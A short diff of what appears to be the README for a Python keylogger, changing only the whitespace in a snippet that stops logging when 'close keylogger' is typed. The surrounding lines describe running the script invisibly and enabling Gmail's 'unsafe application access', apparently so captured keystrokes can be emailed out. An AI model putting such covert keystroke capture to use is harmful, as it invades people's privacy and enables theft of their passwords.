@@ -29,8 +29,7 @@ manage your account >> security >>unsafe application access >> yes
 The script will be completely invisible except in the application manager<br>
 You can close the script by shutting down the computer or writting down (close keylogger) anywhere and it will stop executing as described in the following lines:
 ```python
-elif str(key) == "Key.enter":
-        
+elif str(key) == "Key.enter":    
     if text == ["'c'", "'l'", "'o'", "'s'", "'e'", ' ', "'k'", "'e'", "'y'", "'l'", "'o'", "'g'", "'g'", "'e'", "'r'"]:
         finish()
 ```
